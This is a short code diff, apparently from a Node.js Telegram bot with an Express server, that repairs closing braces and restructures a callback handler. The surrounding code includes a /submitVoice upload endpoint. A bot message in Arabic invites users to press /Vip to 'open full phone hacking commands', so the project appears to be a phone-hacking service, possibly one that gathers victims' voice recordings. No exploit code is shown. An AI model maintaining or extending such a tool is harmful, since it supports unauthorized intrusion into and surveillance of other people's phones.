@@ -1040,6 +1040,7 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
         console.error(error);
         res.status(500).send('خطأ.');
     });
+});
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`الخادم يعمل على المنفذ ${PORT}`);
@@ -1746,9 +1747,11 @@ bot.onText(/\/jjjjjavayy/, (msg) => {
             ]
         }
     });
+});
 
-
-    } else if (query.data === 'add_nammes') {
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    if (query.data === 'add_nammes') {
         bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
         bot.answerCallbackQuery(query.id, { text: '' });
     }
